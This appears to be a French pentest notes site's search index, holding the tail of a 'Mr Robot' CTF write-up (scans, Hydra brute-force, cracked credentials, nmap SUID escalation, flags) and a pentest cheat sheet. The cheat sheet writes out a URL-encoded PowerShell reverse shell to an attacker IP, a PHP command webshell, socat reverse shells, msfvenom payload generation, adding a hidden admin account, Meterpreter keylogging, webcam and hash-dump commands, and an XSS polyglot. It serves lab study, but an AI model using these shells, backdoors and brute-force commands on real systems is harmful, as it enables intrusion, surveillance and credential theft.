80/tcp  open   http     Apache httpd |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). 443/tcp open   ssl/http Apache httpd |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after:  2025-09-13T10:45:03 MAC Address: 02:9D:12:C9:C2:F7 (Unknown)  </p>"},{"location":"Mr-Robot_Write-Up/#gobuster","title":"Gobuster","text":""},{"location":"Mr-Robot_Write-Up/#commandes","title":"Commandes","text":"<p><code>gobuster dir -u http://10.10.37.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</code></p>"},{"location":"Mr-Robot_Write-Up/#informations_1","title":"Informations","text":"<p>/blog (Status: 301) /images (Status: 301) /sitemap (Status: 200) /rss (Status: 301) /login (Status: 302) /video (Status: 301) /0 (Status: 301) /feed (Status: 301) /image (Status: 301) /atom (Status: 301) /wp-content (Status: 301) /admin (Status: 301) /audio (Status: 301) /intro (Status: 200) /wp-login (Status: 200) /css (Status: 301) /rss2 (Status: 301) /license (Status: 200) /wp-includes (Status: 301) /js (Status: 301) /Image (Status: 301) /rdf (Status: 301) /page1 (Status: 301) /readme (Status: 200) /robots (Status: 200)  </p>"},{"location":"Mr-Robot_Write-Up/#wappalizer","title":"Wappalizer","text":""},{"location":"Mr-Robot_Write-Up/#informations_2","title":"Informations","text":"<p>WordPress 4.3.1 Adobe Analytics Google Font API Apache HTTP Server Google PageSpeed 1.9.32.3 PHP5.5.29 MySQL jQuery 1.11.3 Modernizr 2.8.3 jQuery Migrate Google PageSpeed  </p>"},{"location":"Mr-Robot_Write-Up/#wpscan","title":"WPScan","text":""},{"location":"Mr-Robot_Write-Up/#commande_1","title":"Commande","text":"<p><code>wpscan -h http://10.10.37.192/wordpress</code></p>"},{"location":"Mr-Robot_Write-Up/#informations_3","title":"Informations","text":"<p>[+] Headers  | Interesting Entries:  |  - Server: Apache  |  - X-Mod-Pagespeed: 1.9.32.3-4523  | Found By: Headers (Passive Detection)  | Confidence: 100%  </p> <p>[+] robots.txt found: http://10.10.37.192/robots.txt  | Found By: Robots Txt (Aggressive Detection)  | Confidence: 100%  </p> <p>[+] XML-RPC seems to be enabled: http://10.10.37.192/xmlrpc.php  | Found By: Direct Access (Aggressive Detection)  | Confidence: 100%  | References:  |  - http://codex.wordpress.org/XML-RPC_Pingback_API  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner  |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access  </p> <p>[+] The external WP-Cron seems to be enabled: http://10.10.37.192/wp-cron.php  | Found By: Direct Access (Aggressive Detection)  | Confidence: 60%  | References:  |  - https://www.iplocation.net/defend-wordpress-from-ddos  |  - https://github.com/wpscanteam/wpscan/issues/1299  </p> <p>[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).  | Found By: Emoji Settings (Passive Detection)  |  - http://10.10.37.192/d40738b.html, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.3.1'  | Confirmed By: Meta Generator (Passive Detection)  |  - http://10.10.37.192/d40738b.html, Match: 'WordPress 4.3.1'  </p> <p>[+] WordPress theme in use: twentyfifteen  | Location: http://10.10.37.192/wp-content/themes/twentyfifteen/  | Last Updated: 2021-03-09T00:00:00.000Z  | Readme: http://10.10.37.192/wp-content/themes/twentyfifteen/readme.txt  | [!] The version is out of date, the latest version is 2.9  | Style URL: http://10.10.37.192/wp-content/themes/twentyfifteen/style.css?ver=4.3.1  | Style Name: Twenty Fifteen  | Style URI: https://wordpress.org/themes/twentyfifteen/  | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...  | Author: the WordPress team  | Author URI: https://wordpress.org/  |  | Found By: Css Style In 404 Page (Passive Detection)  |  | Version: 1.3 (80% confidence)  | Found By: Style (Passive Detection)  |  - http://10.10.37.192/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'  </p>"},{"location":"Mr-Robot_Write-Up/#brute-force","title":"Brute-force","text":""},{"location":"Mr-Robot_Write-Up/#sqlmap","title":"SQLMap","text":""},{"location":"Mr-Robot_Write-Up/#commande_2","title":"Commande","text":"<p><code>sqlmap -r post_req.txt --current-user</code></p>"},{"location":"Mr-Robot_Write-Up/#informations_4","title":"Informations","text":"<p>Pas injectable :(</p>"},{"location":"Mr-Robot_Write-Up/#hydra","title":"Hydra","text":""},{"location":"Mr-Robot_Write-Up/#commande_3","title":"Commande","text":"<p><code>hydra -L /tmp/fsocity_uniq.dic 10.10.37.192 -p X http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;Log+In:F=Invalid username.\"</code> <code>hydra -l elliot -P /tmp/fsocity_uniq.dic 10.10.37.192 http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;Log+In:F=is incorrect.\"</code></p>"},{"location":"Mr-Robot_Write-Up/#informations_5","title":"Informations","text":"<p>La wordlist comprend beaucoup de doublons, on le voit avec <code>sort fsocity.dic | uniq | wc -l</code> =&gt; 11452 au lieu de ~800000 On enleve les doublons avec la commande suivante : <code>sort fsocity.dic | uniq &gt; fsocity_uniq.dic</code> </p> <p>[80][http-post-form] host: 10.10.37.192   login: elliot   password: X [80][http-post-form] host: 10.10.37.192   login: Elliot   password: X [80][http-post-form] host: 10.10.37.192   login: ELLIOT   password: X  </p> <p>[80][http-post-form] host: 10.10.37.192   login: elliot   password: ER28-0652</p>"},{"location":"Mr-Robot_Write-Up/#acces-initial","title":"Acc\u00e8s initial","text":""},{"location":"Mr-Robot_Write-Up/#identifiant-dans-homerobotpasswordraw-md5","title":"Identifiant dans /home/robot/password.raw-md5","text":"<p>On crack et on trouve : robot:abcdefghijklmnopqrstuvwxyz</p>"},{"location":"Mr-Robot_Write-Up/#escalade-de-privileges","title":"Escalade de privil\u00e8ges","text":"<p>SUID : <code>find / -perm -4000 -type f 2&gt;/dev/null</code> =&gt; /usr/local/bin/nmap <code>nmap --interactive</code> <code>!cat /root/key-3-of-3.txt</code></p>"},{"location":"Mr-Robot_Write-Up/#flags","title":"Flags","text":"<ul> <li>Flag 1 : <code>073403c8a58a1f80d943455fb30724b9</code> </li> <li>Flag 2 : <code>822c73956184f694993bede3eb39f959</code> </li> <li>Flag 3 : <code>04787ddef27c3dee1ee161b21670b4e4</code> </li> </ul>"},{"location":"PenTest_Cheat_Sheet/","title":"PENTEST CHEAT SHEET","text":""},{"location":"PenTest_Cheat_Sheet/#cheat-sheet-ultime","title":"Cheat Sheet ultime","text":"<p>InternalAllTheThings </p>"},{"location":"PenTest_Cheat_Sheet/#nmap","title":"NMAP","text":"<p>Trop de param\u00e8tre possible, se r\u00e9f\u00e9rer \u00e0 \u00e7a : Cheat sheet</p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe","title":"Syntaxe","text":"<p>Scan port <code>nmap -T4 -sC -sV -Pn &lt;IP&gt;</code></p> <p>Scan Samba <code>nmap -p &lt;PORT&gt; --script=smb-enum-shares.nse,smb-enum-users.nse &lt;IP&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#gobuster","title":"GOBUSTER","text":""},{"location":"PenTest_Cheat_Sheet/#parametre","title":"Param\u00e8tre","text":"<p><code>-u &lt;URL&gt;</code> <code>-w &lt;WORDLIST&gt;</code> <code>-t &lt;NOMBRE DE THREAD&gt;</code> </p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe_1","title":"Syntaxe","text":"<p><code>gobuster dir -u &lt;URL&gt; -w &lt;WORDLIST&gt; -t &lt;NOMBRE DE THREAD&gt;</code> </p>"},{"location":"PenTest_Cheat_Sheet/#exemple","title":"Exemple","text":"<p><code>gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</code> </p>"},{"location":"PenTest_Cheat_Sheet/#nikto","title":"NIKTO","text":""},{"location":"PenTest_Cheat_Sheet/#parametre_1","title":"Param\u00e8tre","text":"<p><code>-h &lt;URL&gt;</code> <code>-p &lt;PORT&gt;</code> <code>-Plugin &lt;PLUGIN&gt;</code> <code>-Display &lt;1|2|E&gt;</code> <code>-Tuning &lt;0|2|3|4|8|9&gt;</code> <code>-o &lt;FICHIER&gt;</code> Output </p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe_2","title":"Syntaxe","text":"<p>Header <code>nikto -h &lt;IP&gt; -p &lt;PORT&gt;</code></p> <p>Plugin <code>nikto -h &lt;IP&gt; -Plugin &lt;PLUGIN&gt;</code></p> <p>Verbose <code>nikto -h &lt;IP&gt; -Display &lt;1|2|E&gt;</code></p> <p>1 : Redirections 2 : Cookies E : Erreurs</p> <p>Vuln\u00e9rabilit\u00e9s <code>nikto -h &lt;IP&gt; -Tuning &lt;0|2|3|4|8|9&gt;</code> </p> <p>0 : T\u00e9l\u00e9versement de fichier 2 : D\u00e9fauts de configuration / Fichiers par d\u00e9faut 3 : Divulgation d'informations 4 : Injection 8 : Execution de commande 9 : Injection SQL  </p> <p>Output <code>nikto -h &lt;IP&gt; -o &lt;FICHIER&gt;</code> </p>"},{"location":"PenTest_Cheat_Sheet/#wpscan","title":"WPSCAN","text":""},{"location":"PenTest_Cheat_Sheet/#parametre_2","title":"Param\u00e8tre","text":"<p><code>--url &lt;URL&gt;</code> <code>\u2013-passwords &lt;WORDLIST&gt;</code> <code>\u2013-usernames &lt;UTILISATEUR&gt;</code> </p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe_3","title":"Syntaxe","text":"<p>Th\u00e8me <code>wpscan --url &lt;URL&gt; --enumerate t</code></p> <p>Plugins <code>wpscan --url &lt;URL&gt; --enumerate p</code></p> <p>Utilisateur <code>wpscan --url &lt;URL&gt; --enumerate u</code></p> <p>Brute-force <code>wpscan --url &lt;URL&gt; \u2013-passwords &lt;WORDLIST&gt; \u2013-usernames &lt;UTILISATEUR&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#vulnerabilites-dupload","title":"Vuln\u00e9rabilit\u00e9s d'upload","text":"<ul> <li> <p>Trouver o\u00f9 les fichiers uploader sont d\u00e9pos\u00e9s <code>gobuster dir -u &lt;URL&gt; -w &lt;WORDLIST&gt; -x &lt;EXTENSION&gt; -t 100</code> </p> </li> <li> <p>Enlever le filter c\u00f4t\u00e9 client via BurpSuite  </p> </li> <li> <p>Rechercher quel language le back-end utilise via Wappalizer ou les headers des r\u00e9ponses HTTP (PHP, C#, Node.js, Python, Ruby on Rails, etc.)  </p> </li> <li> <p>T\u00e9l\u00e9charger un reverse shell dans le language et remplacer l'IP/Port par ceux voulus  </p> </li> <li> <p>Nommer le shell avec l'extension qui bypass le filtre c\u00f4t\u00e9 serveur ou changer le type MIME sur BurpSuite  </p> </li> <li> <p>Enumeration pour retrouver le fichier upload\u00e9 (au cas o\u00f9 il aurait \u00e9t\u00e9 renomm\u00e9) <code>gobuster dir -u &lt;URL/URI&gt; -w &lt;WORDLIST&gt; -x &lt;EXTENSION&gt; -t 100</code></p> </li> <li> <p>Une fois le fichier trouv\u00e9, trouver un moyen de l'executer (URI, argument ou console) Ne pas oublier d'avoir son port en \u00e9coute lors de l'execution</p> </li> </ul>"},{"location":"PenTest_Cheat_Sheet/#reverse-shell","title":"Reverse Shell","text":""},{"location":"PenTest_Cheat_Sheet/#webshell","title":"WebShell","text":"<p>Linux </p> <ul> <li>Copier puis modifier /usr/share/webshells/php/php-reverse-shell.php <code>$ip = '&lt;IP ATTAQUANT&gt;';</code> <code>$port = &lt;PORT&gt;;</code> </li> <li>Puis upload sur le site et acc\u00e9der au fichier</li> </ul> <p>Windows </p> <ul> <li> <p>Cr\u00e9er un fichier php avec la ligne suivante : <code>&lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt;</code></p> </li> <li> <p>Entrer l'URL du fichier avec l'argument \"cmd\" et la valeur: powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22</p> </li> </ul> <p>Alors oui, c'est illisible parce que c'est encod\u00e9 pour un URL mais c'est qu'il faut retenir c'est qu'il n'y a qu'\u00e0 changer l'ip et le port (en gras) avant de charger l'URL</p> <ul> <li> <p>On se log avec son listener pr\u00e9f\u00e9r\u00e9 puis on se cr\u00e9er un utlisateur qu'on met dans le groupe admin <code>net user &lt;utlisateur&gt; &lt;mdp&gt; /add</code> <code>net localgroup administrators &lt;utlisateur&gt; /add</code></p> </li> <li> <p>Plus qu'\u00e0 se log en RDP <code>sudo apt install freerdp2-x11</code> <code>xfreerdp /v:&lt;IP CIBLE&gt; /u:&lt;utlisateur&gt; /p:&lt;mdp&gt;</code></p> </li> </ul>"},{"location":"PenTest_Cheat_Sheet/#netcat-reverse-shell","title":"Netcat Reverse Shell","text":""},{"location":"PenTest_Cheat_Sheet/#syntaxe_4","title":"Syntaxe","text":"<p><code>nc -lvnp &lt;PORT&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#stabilisation","title":"Stabilisation","text":"<p><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'</code> (ou python/python2/python3) <code>export TERM=xterm</code> <code>CTRL+Z</code> <code>stty raw -echo; fg</code></p>"},{"location":"PenTest_Cheat_Sheet/#meterpreter","title":"Meterpreter","text":"<p>Commandes principales</p> <p><code>background</code> : Met en arri\u00e8re-plan la session en cours <code>exit</code> : Termine la session Meterpreter <code>guid</code> : R\u00e9cup\u00e8re le GUID de la session  <code>help</code> : Affiche le menu d'aide <code>info</code> : Affiche des informations sur un module Post <code>irb</code> : Ouvre un shell Ruby interactif sur la session courante <code>load</code> : Charge une ou plusieurs extensions de Meterpreter <code>migrate</code> : Permet de migrer Meterpreter vers un autre processus <code>run</code> : Ex\u00e9cute un script Meterpreter ou un module Post <code>sessions</code> : Permet de passer rapidement \u00e0 une autre session  </p> <p>Commandes du syst\u00e8me de fichiers</p> <p><code>cd</code> : Change de r\u00e9pertoire <code>ls</code> : Liste les fichiers du r\u00e9pertoire courant (dir fonctionne aussi) <code>pwd</code> : Imprime le r\u00e9pertoire de travail actuel <code>edit</code> : vous permet d'\u00e9diter un fichier <code>cat</code> : Affiche le contenu d'un fichier \u00e0 l'\u00e9cran. <code>rm</code> : Efface le fichier sp\u00e9cifi\u00e9 <code>search</code> : Recherche des fichiers <code>upload</code> : Charge un fichier ou un r\u00e9pertoire <code>download</code> : T\u00e9l\u00e9chargera un fichier ou un r\u00e9pertoire  </p> <p>Commandes de mise en r\u00e9seau</p> <p><code>arp</code> : Affiche le cache ARP de l'h\u00f4te. <code>ifconfig</code> : Affiche les interfaces r\u00e9seau disponibles sur le syst\u00e8me cible <code>netstat</code> : Affiche les connexions r\u00e9seau <code>portfwd</code> : Transmet un port local \u00e0 un service distant <code>route</code> : Permet d'afficher et de modifier la table de routage.   </p> <p>Commandes du syst\u00e8me</p> <p><code>clearev</code> : Efface les journaux d'\u00e9v\u00e9nements <code>execute</code> : Ex\u00e9cute une commande <code>getpid</code> : Affiche l'identifiant du processus en cours <code>getuid</code> : Affiche l'utilisateur sous lequel Meterpreter est ex\u00e9cut\u00e9 <code>kill</code> : Termine un processus <code>pkill</code> : Termine les processus par leur nom <code>ps</code> : Liste les processus en cours d'ex\u00e9cution <code>reboot</code> : Red\u00e9marre l'ordinateur distant <code>shell</code> : Permet d'entrer dans un shell de commande du syst\u00e8me <code>shutdown</code> : Arr\u00eate l'ordinateur distant <code>sysinfo</code> : Obtient des informations sur le syst\u00e8me distant, telles que OS  </p> <p>Autres commandes (elles seront list\u00e9es sous diff\u00e9rentes cat\u00e9gories dans le menu d'aide) </p> <p><code>idletime</code> : Renvoie le nombre de secondes d'inactivit\u00e9 de l'utilisateur distant. <code>keyscan_dump</code> : Vide la m\u00e9moire tampon des frappes <code>keyscan_start</code> : Commence \u00e0 capturer les frappes de clavier <code>keyscan_stop</code> : Arr\u00eate la capture des frappes <code>screenshare</code> : Permet de regarder le bureau de l'utilisateur distant en temps r\u00e9el <code>screenshot</code> : Capture d'\u00e9cran du bureau interactif <code>record_mic</code> : Enregistre le son du microphone par d\u00e9faut pendant X secondes <code>webcam_chat</code> : D\u00e9marre un chat vid\u00e9o <code>webcam_list</code> : Liste les webcams <code>webcam_snap</code> : Prend un instantan\u00e9 de la webcam sp\u00e9cifi\u00e9e <code>webcam_stream</code> : Lit un flux vid\u00e9o \u00e0 partir de la webcam sp\u00e9cifi\u00e9e <code>getsystem</code> : Tente d'\u00e9lever vos privil\u00e8ges \u00e0 ceux du syst\u00e8me local <code>hashdump</code> : Extrait le contenu de la base de donn\u00e9es SAM  </p>"},{"location":"PenTest_Cheat_Sheet/#socat-basic-reverse-shell","title":"Socat Basic Reverse Shell","text":"<p>Attaquant <code>socat TCP-L:&lt;PORT&gt; -</code> =&gt; Universel <code>socat TCP-L:&lt;PORT&gt; EXEC:\"bash -li\"</code> =&gt; Linux <code>socat TCP-L:&lt;PORT&gt; EXEC:pwsh,pipes</code> =&gt; Windows  </p> <p>Cible <code>socat TCP:&lt;IP ATTAQUANT&gt;:&lt;PORT&gt; EXEC:\"bash -li\"</code> =&gt; Linux <code>socat TCP-L:&lt;IP ATTAQUANT&gt;:&lt;PORT&gt; EXEC:pwsh,pipes</code> =&gt; Windows  </p>"},{"location":"PenTest_Cheat_Sheet/#socat-extended-reverse-shell","title":"Socat Extended Reverse Shell","text":"<p><code>socat TCP:&lt;IP ATTAQUANT&gt;:&lt;PORT&gt; EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane</code></p>"},{"location":"PenTest_Cheat_Sheet/#merterpreter","title":"Merterpreter","text":"<p><code>msfvenom --list payload</code> <code>msfvenom -p &lt;PAYLOAD&gt; -f &lt;FORMAT&gt; -o &lt;OUTPUT&gt; LHOST=&lt;IP ATTAQUANT&gt; LPORT=&lt;PORT&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#escalade-de-privileges-sous-linux","title":"Escalade de privil\u00e8ges sous Linux","text":""},{"location":"PenTest_Cheat_Sheet/#enumeration","title":"\u00c9num\u00e9ration","text":"<ul> <li>LinEnum </li> <li>LinPEAS</li> </ul>"},{"location":"PenTest_Cheat_Sheet/#scripts","title":"Scripts","text":"<ul> <li>LES (Linux Exploit Suggester) </li> <li>Linux Smart Enumeration </li> <li>Linux Priv Checker </li> </ul>"},{"location":"PenTest_Cheat_Sheet/#sequences-dechappement-shell","title":"S\u00e9quences d'\u00e9chappement Shell","text":"<p>GTFOBins </p> <ul> <li>Variable d'environnement sudo</li> <li>Crontab en g\u00e9n\u00e9ral</li> <li>SUID/SGID <ul> <li><code>find / -perm -2000 -type f 2&gt;/dev/null</code></li> <li><code>find / -perm -4000 -type f 2&gt;/dev/null</code> </li> <li><code>find / -perm -6000 -type f 2&gt;/dev/null</code> </li> </ul> </li> </ul>"},{"location":"PenTest_Cheat_Sheet/#autres","title":"Autres","text":"<p>/etc/shadow en lecture/\u00e9criture</p> <p>/etc/passwd en lecture/\u00e9criture</p> <p>Cl\u00e9s SSH</p> <p>Mot de passe dans les fichiers de configurations</p> <p>NFS</p> <p>Exploit Kernel (\u00e0 \u00e9viter car peut d\u00e9stabiliter le syst\u00e8me)</p> <p>Capabilities <code>getcap -r / 2&gt;/dev/null</code></p>"},{"location":"PenTest_Cheat_Sheet/#escalade-de-privileges-sous-windows","title":"Escalade de privil\u00e8ges sous Windows","text":""},{"location":"PenTest_Cheat_Sheet/#enumeration_1","title":"\u00c9num\u00e9ration","text":"<ul> <li>WinPEAS </li> <li>PowerUp <ul> <li><code>. .\\PowerUp.ps1</code> </li> <li><code>Invoke-AllChecks</code> </li> </ul> </li> </ul>"},{"location":"PenTest_Cheat_Sheet/#scripts_1","title":"Scripts","text":"<ul> <li>PrivescCheck </li> <li>WES-NG </li> <li>multi/recon/local_exploit_suggester avec une session meterpreter  </li> </ul>"},{"location":"PenTest_Cheat_Sheet/#sequences-dechappement","title":"S\u00e9quences d'\u00e9chappement","text":"<p>lolbas </p>"},{"location":"PenTest_Cheat_Sheet/#johntheripper","title":"JohnTheRipper","text":""},{"location":"PenTest_Cheat_Sheet/#parametre_3","title":"Param\u00e8tre","text":"<p><code>--wordlist=&lt;WORDLIST&gt;</code> Wordlist <code>--show &lt;FICHIER&gt;</code> Renvoie les mots de passes crack\u00e9</p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe_5","title":"Syntaxe","text":"<p><code>john --wordlist=&lt;WORDLIST&gt; &lt;FICHIER&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#hashcat","title":"Hashcat","text":"<p>Liste hash</p>"},{"location":"PenTest_Cheat_Sheet/#parametre_4","title":"Param\u00e8tre","text":"<p><code>-a &lt;VALEUR&gt;</code> Type d'attaque <code>-m &lt;VALEUR&gt;</code> Type de hash </p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe_6","title":"Syntaxe","text":"<p><code>hashcat -a &lt;VALEUR&gt; -m &lt;VALEUR&gt; &lt;FICHIER&gt; &lt;WORDLIST&gt;</code> </p>"},{"location":"PenTest_Cheat_Sheet/#exemple_1","title":"Exemple","text":"<p><code>hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt</code></p>"},{"location":"PenTest_Cheat_Sheet/#sqlmap","title":"SQLmap","text":"<p>CheatSheet</p>"},{"location":"PenTest_Cheat_Sheet/#parametre_5","title":"Param\u00e8tre","text":"<p><code>-u \"&lt;URL&gt;\"</code> <code>-p \"&lt;PARAM A TESTER&gt;\"</code> <code>--current-user</code> R\u00e9cup\u00e8re l'utilisateur courant <code>--is-dba</code> V\u00e9rifie si l'utilisateur courant est admin <code>--hostname</code> R\u00e9cup\u00e8re le nom de l'h\u00f4te <code>--users</code> R\u00e9cup\u00e8re les utilisateurs de la base de donn\u00e9es <code>--passwords</code> R\u00e9cup\u00e8re les mots de passe des utilisateurs de la base de donn\u00e9es <code>--privileges</code> R\u00e9cup\u00e8re les privil\u00e8ges <code>--all</code> R\u00e9cup\u00e8re tout <code>--dump</code> Dump les entr\u00e9es des tables <code>--dbs</code> Nom des bases de donn\u00e9es disponible <code>--tables</code> R\u00e9cup\u00e8re les tables de la base de donn\u00e9es ( -D  ) <code>--columns</code> R\u00e9cup\u00e8re les colonnes de la base de donn\u00e9es ( -D  -T  ) <code>-D &lt;NOM DB&gt; -T &lt;NOM TABLE&gt; -C &lt;NOM COLONNE&gt;</code> Dump les colonnes <code>--os-cmd</code> Ex\u00e9cute une commande shell <code>--os-shell</code> Cr\u00e9\u00e9 un session shell simple <code>--os-pwn</code> D\u00e9marre un reverse shell <code>--file-read=/chemin/vers/le/fichier</code> Lire le contenu d'un fichier"},{"location":"PenTest_Cheat_Sheet/#syntaxe_7","title":"Syntaxe","text":"<p>A partir d'une capture <code>sqlmap -r req.txt --current-user</code></p> <p>A partir d'une requ\u00eate POST <code>sqlmap -u \"http://exemple.com\" --data \"username=*&amp;password=*\"</code></p>"},{"location":"PenTest_Cheat_Sheet/#hydra","title":"Hydra","text":""},{"location":"PenTest_Cheat_Sheet/#parametres","title":"Param\u00e8tres","text":"<p><code>-l &lt;UTILISATEUR&gt;</code> <code>-L &lt;LISTE UTILISATEUR&gt;</code> <code>-P &lt;WORDLIST&gt;</code> <code>-t &lt;NOMBRE DE THREAD&gt; (16 par d\u00e9faut)</code> <code>-V (mode verbeux)</code> </p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe_8","title":"Syntaxe","text":"<p>FTP <code>hydra -l &lt;UTILISATEUR&gt; -P &lt;WORDLIST&gt; -t 64 ftp://&lt;IP&gt;</code></p> <p>SSH <code>hydra -l &lt;UTILISATEUR&gt; -P &lt;WORDLIST&gt; &lt;IP&gt; -t 64 ssh</code></p> <p>Formulaire web POST <code>hydra &lt;UTILISATEUR&gt; &lt;WORDLIST&gt; &lt;IP&gt; http-post-form \"&lt;CHEMIN&gt;:&lt;IDENTIFIANT&gt;:&lt;REPONSE_INVALIDE&gt;\"</code> Exemple : <code>hydra -l &lt;UTILISATEUR&gt; -P &lt;WORDLIST&gt; &lt;IP&gt; http-post-form \"/:username=^USER^&amp;password=^PASS^:F=Your username or password is incorrect\"</code></p>"},{"location":"PenTest_Cheat_Sheet/#samba","title":"Samba","text":"<p>Acc\u00e8s <code>smbclient //&lt;IP&gt;/&lt;PARTAGE&gt;</code></p> <p>T\u00e9l\u00e9chargement <code>smbget -R smb://&lt;IP&gt;/&lt;PARTAGE&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#exploit","title":"Exploit","text":"<p>Exploit Database</p>"},{"location":"PenTest_Cheat_Sheet/#metasploit","title":"MetaSploit","text":"<p><code>msfconsole</code> <code>search &lt;KEYWORD&gt;</code> <code>use &lt;NOMBRE&gt;</code> <code>options</code> <code>set &lt;OPTION&gt;</code> <code>run</code> </p>"},{"location":"PenTest_Cheat_Sheet/#cross-site-scripting","title":"Cross-Site scripting","text":""},{"location":"PenTest_Cheat_Sheet/#xss-polyglot-payload","title":"XSS Polyglot Payload","text":"<p><code>jaVasCript:/*-/*'/*'/*'/*\"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\\x3e</code> (Remplacer les ' par `)</p>"},{"location":"PenTest_Cheat_Sheet/#injection-de-commande","title":"Injection de commande","text":"<p>Cheat Sheet </p>"}]}